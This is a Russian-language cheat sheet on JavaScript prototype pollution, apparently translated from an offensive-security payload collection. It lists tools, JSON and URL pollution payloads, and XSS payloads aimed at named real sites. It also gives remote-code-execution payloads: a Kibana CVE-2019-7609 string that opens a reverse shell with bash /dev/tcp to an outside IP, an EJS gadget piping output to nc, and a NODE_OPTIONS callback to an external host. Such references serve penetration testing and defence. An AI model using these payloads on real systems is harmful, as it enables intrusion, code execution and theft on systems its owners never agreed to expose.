# Prototype Pollution (Загрязнение прототипов)

> **Загрязнение прототипов** — это тип уязвимости, возникающей в JavaScript, когда изменяются свойства `Object.prototype`. Это особенно опасно, потому что объекты JavaScript являются динамическими, и мы можем добавлять в них свойства в любое время. Кроме того, почти все объекты в JavaScript наследуются от `Object.prototype`, что делает его потенциальным вектором атаки.

- [Инструменты](#Инструменты)
- [Методология](#Методология)
    - [Примеры](#examples)
    - [Ручное тестирование](#manual-testing)
    - [Загрязнение прототипа через JSON-ввод](#prototype-pollution-via-json-input)
    - [Загрязнение прототипа в URL](#prototype-pollution-in-url)
    - [Полезные нагрузки для загрязнения прототипа](#prototype-pollution-payloads)
    - [Гаджеты для загрязнения прототипа](#prototype-pollution-gadgets)
- [Ссылки](#references)

# Инструменты

- [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder) — Помогает найти гаджеты для эксплуатации загрязнения прототипов.
- [yuske/silent-spring](https://github.com/yuske/silent-spring) — Загрязнение прототипов, ведущее к удаленному выполнению кода в Node.js.
- [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) — Гаджеты для серверного загрязнения прототипов в ядре Node.js и сторонних NPM-пакетах.
- [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution) — Загрязнение прототипов и полезные скриптовые гаджеты на стороне клиента.
- [portswigger/server-side-prototype-pollution](https://github.com/portswigger/server-side-prototype-pollution) — Расширение для Burp Suite, обнаруживающее уязвимости загрязнения прототипов.
- [msrkp/PPScan](https://github.com/msrkp/PPScan) — Сканер загрязнения прототипов на стороне клиента.

# Методология

В JavaScript прототипы — это то, что позволяет объектам наследовать функции от других объектов. Если злоумышленник может добавить или изменить свойства `Object.prototype`, он может повлиять на все объекты, которые наследуются от этого прототипа, что потенциально может привести к различным видам угроз безопасности.

```javascript
var myDog = new Dog();

// Указывает на функцию "Dog"
myDog.constructor;

// Указывает на определение класса "Dog"
myDog.constructor.prototype;
myDog.__proto__;
myDog["__proto__"];
```

### Примеры

Представьте, что приложение использует объект для хранения настроек конфигурации, например:

```javascript
let config = {
    isAdmin: false
};
```

Пользователь может добавить свойство `isAdmin` в `Object.prototype` следующим образом:

```javascript
Object.prototype.isAdmin = true;
```

## Ручное тестирование

*   **ExpressJS:** `{ "__proto__":{"parameterLimit":1}}` + 2 параметра в GET-запросе, по крайней мере 1 должен отражаться в ответе.
*   **ExpressJS:** `{ "__proto__":{"ignoreQueryPrefix":true}}` + `?foo=bar`
*   **ExpressJS:** `{ "__proto__":{"allowDots":true}}` + `?foo.bar=baz`
*   **Изменение отступа JSON-ответа:** `{ "__proto__":{"json spaces":" "}}` + `{"foo":"bar"}`, сервер должен вернуть `{"foo": "bar"}`.
*   **Изменение заголовков CORS:** `{ "__proto__":{"exposedHeaders":["foo"]}}`, сервер должен вернуть заголовок `Access-Control-Expose-Headers`.
*   **Изменение кода состояния:** `{ "__proto__":{"status":510}}`

## Загрязнение прототипа через JSON-ввод

Вы можете получить доступ к прототипу любого объекта через магическое свойство `__proto__`. Функция `JSON.parse()` в JavaScript используется для разбора JSON-строки и преобразования ее в объект JavaScript. Обычно это функция-сток (sink), где может произойти загрязнение прототипа.

```json
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```

Асинхронная полезная нагрузка для NodeJS.

```json
{
  "__proto__": {
    "argv0": "node",
    "shell": "node",
    "NODE_OPTIONS": "--inspect=payload\"\".oastify\"\".com"
  }
}
```

Загрязнение прототипа через свойство `constructor`.

```json
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```

## Загрязнение прототипа в URL

Примеры полезных нагрузок для загрязнения прототипа, найденных в реальных условиях.

```
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```

## Эксплуатация загрязнения прототипа

В зависимости от того, выполняется ли загрязнение прототипа на стороне клиента (CSPP) или на стороне сервера (SSPP), последствия будут различаться.

*   **Удаленное выполнение команд:** RCE в Kibana (CVE-2019-7609)

    ```
    .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
    .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
    ```

*   **Удаленное выполнение команд:** RCE с использованием гаджетов EJS

    ```json
    {
        "__proto__": {
            "client": 1,
            "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
        }
    }
    ```

*   **Отраженный XSS:** Reflected XSS on www.hackerone.com via Wistia embed code - #986386
*   **Обход на стороне клиента:** Prototype pollution – and bypassing client-side HTML sanitizers
*   **Отказ в обслуживании (Denial of Service)**

## Полезные нагрузки для загрязнения прототипа

```
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test
```

## Гаджеты для загрязнения прототипа

**"Гаджет"** в контексте уязвимостей обычно относится к фрагменту кода или функциональности, которые могут быть использованы во время атаки. Когда мы говорим о **"гаджете для загрязнения прототипа"**, мы имеем в виду конкретный путь выполнения кода, функцию или возможность приложения, которые восприимчивы к атаке через загрязнение прототипа или могут быть использованы через нее.

Вы можете либо создать свой собственный гаджет, используя часть исходного кода с помощью **yeswehack/pp-finder**, либо попытаться использовать уже обнаруженные гаджеты из репозиториев **yuske/server-side-prototype-pollution** или **BlackFan/client-side-prototype-pollution**.
